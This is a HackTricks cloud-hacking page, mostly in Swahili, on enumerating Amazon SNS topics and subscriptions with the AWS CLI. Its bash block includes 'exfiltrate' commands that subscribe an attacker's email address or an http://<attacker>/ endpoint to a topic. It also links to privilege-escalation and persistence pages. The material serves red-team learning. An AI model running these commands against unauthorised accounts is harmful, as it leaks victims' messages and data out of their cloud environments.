# AWS - SNS Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## SNS

Amazon Simple Notification Service (Amazon SNS) inafafanuliwa kama **huduma ya ujumbe inayosimamiwa kikamilifu**. Inasaidia aina za mawasiliano **kutoka programu hadi programu** (A2A) na **kutoka programu hadi mtu** (A2P).

Vipengele muhimu kwa mawasiliano ya A2A ni pamoja na **mekanismu za kuchapisha/kujiunga (pub/sub)**. Mekanismu hizi zinaanzisha **mada**, muhimu kwa kuwezesha ujumbe wa **kuwasilisha, unaotegemea, wa wengi kwa wengi**. Kipengele hiki ni cha faida sana katika hali zinazohusisha mifumo iliyosambazwa, huduma ndogo, na usanifu wa seva zisizo na matukio. Kwa kutumia mada hizi, mifumo ya wachapishaji inaweza kusambaza ujumbe kwa ufanisi kwa **mifumo mbalimbali ya wapokeaji**, ikiruhusu muundo wa ujumbe wa fanout.

### **Difference with SQS**

**SQS** ni huduma ya **mifumo ya foleni** inayoruhusu mawasiliano ya pointi hadi pointi, kuhakikisha kwamba ujumbe unachakatwa na **mpokeaji mmoja**. Inatoa **usambazaji angalau mara moja**, inasaidia foleni za kawaida na FIFO, na inaruhusu uhifadhi wa ujumbe kwa ajili ya kurudiwa na usindikaji wa kucheleweshwa.\
Kwa upande mwingine, **SNS** ni huduma inayotegemea **kuchapisha/kujiunga**, ikiruhusu mawasiliano **moja hadi wengi** kwa kutangaza ujumbe kwa **wapokeaji wengi** kwa wakati mmoja. Inasaidia **nukuu mbalimbali za kujiunga kama barua pepe, SMS, kazi za Lambda, na HTTP/HTTPS**, na inatoa mekanismu za kuchuja kwa usambazaji wa ujumbe wa lengo.\
Ingawa huduma zote mbili zinawezesha kutenganisha kati ya vipengele katika mifumo iliyosambazwa, SQS inazingatia mawasiliano ya foleni, na SNS inasisitiza muundo wa mawasiliano ya matukio, fan-out.

### **Enumeration**
```bash
# Get topics & subscriptions
aws sns list-topics
aws sns list-subscriptions
aws sns list-subscriptions-by-topic --topic-arn <arn>

# Check privescs & post-exploitation
aws sns publish --region <region> \
--topic-arn "arn:aws:sns:us-west-2:123456789012:my-topic" \
--message file://message.txt

# Exfiltrate through email
## You will receive an email to confirm the subscription
aws sns subscribe --region <region> \
--topic-arn arn:aws:sns:us-west-2:123456789012:my-topic \
--protocol email \
--notification-endpoint my-email@example.com

# Exfiltrate through web server
## You will receive an initial request with a URL in the field "SubscribeURL"
## that you need to access to confirm the subscription
aws sns subscribe --region <region>\
--protocol http \
--notification-endpoint http://<attacker>/ \
--topic-arn <arn>
```
{% hint style="danger" %}
Kumbuka kwamba ikiwa **mada ni ya aina ya FIFO**, ni wanachama pekee wanaotumia itifaki **SQS** wanaweza kutumika (HTTP au HTTPS haiwezi kutumika).

Pia, hata kama `--topic-arn` ina eneo hakikisha unataja eneo sahihi katika **`--region`** au utapata kosa linaloashiria kwamba huna ufikiaji lakini tatizo ni eneo.
{% endhint %}

#### Ufikiaji Usio na Uthibitisho

{% content-ref url="../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md" %}
[aws-sns-unauthenticated-enum.md](../aws-unauthenticated-enum-access/aws-sns-unauthenticated-enum.md)
{% endcontent-ref %}

#### Kuinua Haki

{% content-ref url="../aws-privilege-escalation/aws-sns-privesc.md" %}
[aws-sns-privesc.md](../aws-privilege-escalation/aws-sns-privesc.md)
{% endcontent-ref %}

#### Baada ya Kutekeleza

{% content-ref url="../aws-post-exploitation/aws-sns-post-exploitation.md" %}
[aws-sns-post-exploitation.md](../aws-post-exploitation/aws-sns-post-exploitation.md)
{% endcontent-ref %}

#### Kudumu

{% content-ref url="../aws-persistence/aws-sns-persistence.md" %}
[aws-sns-persistence.md](../aws-persistence/aws-sns-persistence.md)
{% endcontent-ref %}

## Marejeo

* [https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/](https://aws.amazon.com/about-aws/whats-new/2022/01/amazon-sns-attribute-based-access-controls/)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
{% endhint %}
